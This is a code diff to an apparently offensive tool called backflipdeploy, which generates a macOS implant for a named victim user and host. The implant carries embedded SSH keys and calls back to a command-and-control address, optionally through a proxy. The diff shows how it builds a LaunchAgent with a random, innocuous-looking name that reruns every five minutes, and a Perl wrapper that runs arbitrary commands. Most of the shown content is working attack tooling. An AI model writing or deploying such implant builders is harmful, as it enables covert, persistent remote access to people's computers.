@@ -22,7 +22,7 @@ payloadsDir = Path(f"{backflipsBaseDir}/payloads/")
 cleanupScriptsDir = Path(f"{backflipsBaseDir}/cleanup/")
 
 def usage():
-    print ("usage: %s <username> <victim_host> <c2_fqdn/ip> <port> <remoteport>" % sys.argv[0])
+    print ("usage: %s <victim_username> <victim_host> <c2_fqdn/ip> <port> <remoteport> [target_proxy]" % sys.argv[0])
     sys.exit(1)
 
 def templify(template, replacements):
@@ -84,6 +84,11 @@ def main():
     flockfilename = "".join(getrandomwords(1))
     lagentname = f"com.{'.'.join(getrandomwords(2))}.worker"
     imaginarypayloadname = "".join(getrandomwords(1))
+    if len(sys.argv) > 6:
+        targetProxy = sys.argv[6]
+    else:
+        targetProxy = ""
+
 
     print(f"[*] Date of backflipdeploy invocation: {str(datetime.datetime.utcnow())} UTC")   
     print ("[*] victim host: %s" % victim_hostname)
@@ -107,39 +112,45 @@ def main():
     privencoded = privstring.encode("utf-8")
     privkey = base64.b64encode(privencoded)
 
-    lagentPlistXML = base64.b64encode(f'''<?xml version="1.0" encoding="UTF-8"?>
+    lagentPlistXML = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
   <key>Label</key>
   <string>{lagentname}</string>
   <key>Program</key>
-  <string>/Users/home/Library/LaunchAgents/{imaginarypayloadname}.sh</string>
+  <string>/Users/{username}/Library/LaunchAgents/{imaginarypayloadname}</string>
   <key>StartInterval</key>
   <integer>300</integer>
   <key>RunAtLoad</key>
   <true/>
 </dict>
-</plist>'''.encode('utf-8')).decode('utf-8')
+</plist>'''
 
-    motherflock = base64.b64encode(f"""#!/usr/bin/env perl
+    lagentPlistXML_b64 = base64.b64encode(lagentPlistXML.encode('utf-8')).decode('utf-8')
+
+    motherflock = f"""#!/usr/bin/env perl
 # {" ".join(getrandomwords(3))}
 use Fcntl ':flock';open my $self, '<', $0 or die;flock $self, LOCK_EX | LOCK_NB or die;system(@ARGV);
-# {" ".join(getrandomwords(2))}""".encode('utf-8')).decode('utf-8')
+# {" ".join(getrandomwords(2))}"""
 
-    implant_py = getfile(os.path.join(sys.path[0], "loadssh_template.sh"))
+    motherflock_b64 = base64.b64encode(motherflock.encode('utf-8')).decode('utf-8')
+
+    implant_py = getfile(os.path.join(sys.path[0], "payload_template.sh"))
     cleanup_py = getfile(os.path.join(sys.path[0], "cleanup.py"))
     implant = templify(implant_py, {
+        "TARGET_USER" : username,
         "PORT_PLACEHOLDER" : port,
         "REMOTE_PLACEHOLDER": remoteport,
         "FQDN_PLACEHOLDER" : fqdn,
+        "TARGET_PROXY" : targetProxy,
         "PRIVATE_KEY_PLACEHOLDER" : privkey.decode("utf-8"),
         "PUBLIC_KEY_PLACEHOLDER" : pubkey.decode("utf-8"),
         "BACKFLIP_PUB_PLACEHOLDER" : backkey.decode("utf-8"),
         "PRIVATE_KEY_PATH_PLACEHOLDER" : payloadkeyname,
         "FLOCK_NAME_PLACEHOLDER" : flockfilename,
-        "FLOCK_CODE_PLACEHOLDER" : motherflock,
-        "LAGENT_XML_PLACEHOLDER" : lagentPlistXML,
+        "FLOCK_CODE_PLACEHOLDER" : motherflock_b64,
+        "LAGENT_XML_PLACEHOLDER" : lagentPlistXML_b64,
         "LAGENT_NAME_PLACEHOLDER" : lagentname,
         "IMAGINARY_PAYLOAD_NAME" : imaginarypayloadname,
         })
@@ -160,16 +171,18 @@ use Fcntl ':flock';open my $self, '<', $0 or die;flock $self, LOCK_EX | LOCK_NB 
     implantHash = hashlib.md5(implant.encode('utf-8')).hexdigest()
     flockHash = hashlib.md5(motherflock.encode('utf-8')).hexdigest()
     implantPrivKeyHash = hashlib.md5(payloadkeyname.encode('utf-8')).hexdigest()
+    lagentHash = hashlib.md5(lagentPlistXML.encode('utf-8')).hexdigest()
 
     print(f"\n[+] Path of backflip public key on infra: {keyPath}")
-    print(f"[I] Name of backflip private key file is '{payloadkeyname}' instead of badger")
+    print(f"[I] Name of backflip private key file is '{payloadkeyname}'")
     print(f"[I] MD5 hash for backflip private key is '{payloadkeyname}' is '{implantPrivKeyHash}'")
     print(f"\n[+] Path of backflip payload on infra: {payloadsDir}/{implantName}")
+    print(f"[I] This specific backflip payload calls itself '{imaginarypayloadname}' but you can call it whatever name you like")
     print(f"[I] MD5 hash for backflip payload is '{implantHash}'")
     print(f"[I] Name of FLock file is '{flockfilename}.pl'")
     print(f"[I] MD5 hash for FLock is '{flockHash}'")
     print(f"[I] Name of LaunchAgent is '{lagentname}'")
-    print(f"[I] MD5 hash for LaunchAgent must be calculated on the victim host.")
+    print(f"[I] MD5 hash for LaunchAgent if you supplied the correct victim username is '{lagentHash}'")
     print(f"\n[+] Path of cleanup script on infra: {cleanupScriptsDir}/{implantName}_cleanup.py")
     print(f"\n[+] Have a nice day!")
 
